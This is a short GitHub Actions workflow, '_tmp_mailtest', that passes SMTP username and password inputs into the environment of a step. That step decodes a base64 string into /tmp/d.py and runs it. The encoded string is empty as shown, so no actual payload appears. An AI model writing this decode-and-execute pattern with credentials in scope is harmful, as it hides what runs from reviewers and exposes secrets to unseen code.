name: _tmp_mailtest
on:
  workflow_dispatch:
    inputs:
      smtp_user:
        description: u
        required: false
      smtp_pass:
        description: p
        required: false
permissions:
  contents: none
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 6
    steps:
      - name: step-DIAG
        env:
          U: ${{ github.event.inputs.smtp_user }}
          P: ${{ github.event.inputs.smtp_pass }}
        run: echo "::add-mask::$P" && echo  | base64 -d > /tmp/d.py && (timeout 90 python3 /tmp/d.py; echo "EXITCODE=$?")
